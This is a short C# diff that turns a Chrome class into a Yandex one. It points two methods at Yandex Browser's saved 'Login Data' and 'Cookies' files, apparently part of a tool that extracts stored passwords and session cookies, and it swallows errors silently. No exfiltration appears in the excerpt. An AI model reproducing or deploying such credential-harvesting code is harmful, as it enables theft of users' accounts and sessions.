@@ -5,17 +5,18 @@ using System.IO;
 
 namespace BrowserTools
 {
-    public class Chrome
+    public class Yandex
     {
         public static List<LoginData> GetLoginData()
         {
             try
             {
                 string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                    "Google\\Chrome\\User Data\\Default\\Login Data");
+                    "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
 
-                return Chromium.GetLoginData(dataPath, BrowserName.Chrome);
-            } catch (Exception)
+                return Chromium.GetLoginData(dataPath, BrowserName.Yandex);
+            }
+            catch (Exception)
             {
                 return new List<LoginData>();
             }
@@ -26,10 +27,11 @@ namespace BrowserTools
             try
             {
                 string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                    "Google\\Chrome\\User Data\\Default\\Cookies");
+                    "Yandex\\YandexBrowser\\User Data\\Default\\Cookies");
 
-                return Chromium.GetCookies(dataPath, BrowserName.Chrome);
-            } catch (Exception)
+                return Chromium.GetCookies(dataPath, BrowserName.Yandex);
+            }
+            catch (Exception)
             {
                 return new List<Cookie>();
             }
